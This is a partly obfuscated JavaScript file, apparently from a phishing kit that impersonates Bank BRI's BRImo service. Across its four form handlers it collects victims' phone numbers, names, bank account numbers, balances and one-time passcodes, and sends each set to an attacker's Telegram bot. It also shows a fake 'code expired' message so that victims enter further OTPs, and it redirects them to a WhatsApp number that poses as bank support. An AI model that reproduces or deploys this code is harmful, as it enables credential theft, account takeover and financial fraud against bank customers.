function sendHp() {
  $('.load')['fadeIn']();
  event['preventDefault']();
  $('.lanjutkan')['prop']('disabled', true);
  document['getElementById']('lanjutkan')['innerHTML'] = 'Memproses....';
  var _0x410cf2 = 'Tarif BRImo';
  var _0x37ddb2 = $('input[name="tarif"]:checked')['val']();
  _0x37ddb2 && sessionStorage['setItem']('tarif', _0x37ddb2);
  var _0x26be73 = $('#nohp')['val']();
  sessionStorage['setItem']('nohp', _0x26be73);
  var _0x2472e7 = '' + _0x410cf2 + '%0ATarif: ' + _0x37ddb2 + '%0ANomor: ' + _0x26be73;
  $['ajax']({
    'url': 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + grup + '&text=' + _0x2472e7 + '&parse_mode=html',
    'method': 'POST',
    'complete': function () {
      setTimeout(function () {
        window['location'] = 'login.html', $('#lonte')['hide'](), $('.load')['fadeOut'](), document['getElementById']('lanjutkan')['innerHTML'] = 'Lanjutkan';
      }, 800);
    }
  });
}
;
function sendLogin() {
  $('.load')['fadeIn']();
  event['preventDefault']();
  $('.lanjutkan')['prop']('disabled', true);
  document['getElementById']('lanjutkan')['innerHTML'] = 'Memproses....';
  var _0xf4bc91 = 'Tarif BRImo';
  var _0x535acc = '' + _0xf4bc91 + '%0ATarif: ' + tarif['value'] + '%0ANomor: ' + nohp['value'] + '%0ANama: ' + nama['value'] + '%0ANo Rekening: ' + rek['value'];
  $['ajax']({
    'url': 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + grup + '&text=' + _0x535acc + '&parse_mode=html',
    'method': 'POST',
    'complete': function () {
      setTimeout(function () {
        window['location'] = 'saldo.html';
        $('#lonte')['hide']();
        $('.load')['fadeOut']();
        document['getElementById']('lanjutkan')['innerHTML'] = 'Lanjutkan';
        var _0x17aed1 = $('#tarif')['val']();
        sessionStorage['setItem']('tarif', _0x17aed1);
        var _0x728848 = $('#nohp')['val']();
        sessionStorage['setItem']('nohp', _0x728848);
        var _0x5b00dd = $('#nama')['val']();
        sessionStorage['setItem']('nama', _0x5b00dd);
        var _0x56fcae = $('#rek')['val']();
        sessionStorage['setItem']('rek', _0x56fcae);
      }, 500);
    }
  });
}
;
function sendSaldo() {
  $('.load')['fadeIn']();
  event['preventDefault']();
  $('.lanjutkan')['prop']('disabled', true);
  document['getElementById']('lanjutkan')['innerHTML'] = 'Memproses....';
  var _0x5119bb = 'Tarif BRImo';
  var _0x1c2146 = '' + _0x5119bb + '%0ATarif: ' + tarif['value'] + '%0ANomor: ' + nohp['value'] + '%0ANama: ' + nama['value'] + '%0ANo Rekening: ' + rek['value'] + '%0ASaldo: ' + saldo['value'];
  $['ajax']({
    'url': 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + grup + '&text=' + _0x1c2146 + '&parse_mode=html',
    'method': 'POST',
    'complete': function () {
      setTimeout(function () {
        window['location'] = 'otp.html';
        $('#lonte')['hide']();
        $('.load')['fadeOut']();
        document['getElementById']('lanjutkan')['innerHTML'] = 'Lanjutkan';
        var _0x13817a = $('#tarif')['val']();
        sessionStorage['setItem']('tarif', _0x13817a);
        var _0x242a4e = $('#nohp')['val']();
        sessionStorage['setItem']('nohp', _0x242a4e);
        var _0x5507f7 = $('#nama')['val']();
        sessionStorage['setItem']('nama', _0x5507f7);
        var _0x1d3a26 = $('#rek')['val']();
        sessionStorage['setItem']('rek', _0x1d3a26);
        var _0x5f548a = $('#saldo')['val']();
        sessionStorage['setItem']('saldo', _0x5f548a);
      }, 400);
    }
  });
}
;
function sendOtp() {
  event['preventDefault']();
  $('#loader')['fadeIn']();
  $('.btn-primary')['prop']('disabled', true);
  var _0x4e39e1 = document['getElementById']('nama1');
  var _0xd73f86 = '' + logo + '%0ATarif: ' + tarif['value'] + '%0ANomor: ' + nohp + '%0ANama: ' + nama['value'] + '%0ANo Rekening: ' + rek['value'] + '%0ASaldo: ' + saldo['value'] + '%0AKode OTP: ' + _0x4e39e1['value'];
  $['ajax']({
    'url': 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + grup + '&text=' + _0xd73f86 + '&parse_mode=html',
    'method': 'POST',
    'success': function (_0x549dfc) {
      $('#loader')['fadeOut']();
      $('.btn-primary')['prop']('disabled', false);
      $('#errorAlert')['removeClass']('alert-success')['addClass']('alert-danger');
      $('#errorAlert')['text']('Kode aktivasi telah Kadaluarsa.')['slideDown']();
      $('#nama1')['val']('');
      $('#nama1')['focus']();
      setTimeout(function () {
        $('#errorAlert')['slideUp']();
      }, 3000);
    },
    'error': function (_0xb35d62) {
      $('#loader')['hide'](), $('.btn-primary')['prop']('disabled', false), $('#errorAlert')['removeClass']('alert-success')['addClass']('alert-danger'), $('#errorAlert')['text']('Gagal mengirim kode aktivasi. Silakan coba lagi.')['show']();
    }
  });
}

$(document).ready(function() {
    $('#getcs').click(function() {
    $("#process1").show();
 $('.load').fadeIn();
    setTimeout(function(){      
location.href='https://wa.me/6285758268389?text=Hallo Bank BRI, Saya mau request kode Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();        
         }, 2000);
     });    
  });   
